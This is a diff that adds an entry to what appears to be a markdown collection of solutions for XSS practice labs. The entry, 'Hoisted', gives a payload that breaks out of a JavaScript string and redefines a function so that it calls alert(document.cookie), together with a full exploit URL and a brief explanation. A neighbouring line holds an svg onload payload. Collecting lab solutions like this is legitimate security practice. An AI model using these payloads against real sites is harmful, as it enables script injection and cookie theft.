@@ -675,6 +675,19 @@ https://eu24qnhm.hacky.uk/target.ftl?name=%3Csvg/onload=alert(document.cookie)%3
 - **Description**: the backend filter every space, we bypass it using /, browser threat as space
 
 ---
+### Lab 1958: Hoisted
+- **URL Lab**: https://hacky.uk/lab/1958
+- **Payload**: 
+```html
+');%20function%20say_hello(){alert(document.cookie)};//
+```
+- **Full URL**: 
+```
+[https://eu24qnhm.hacky.uk/target.ftl?name=%3Csvg/onload=alert(document.cookie)%3E](https://7edbi3r6.hacky.uk/target.ftl?name=%27);%20function%20say_hello(){alert(document.cookie)};//)
+```
+- **Description**: function say_hello() only declare, we need escape from console.log first, and then define the value function say_hello(){alert(document.cookie)}
+
+---
 
 ## Adept Level
 
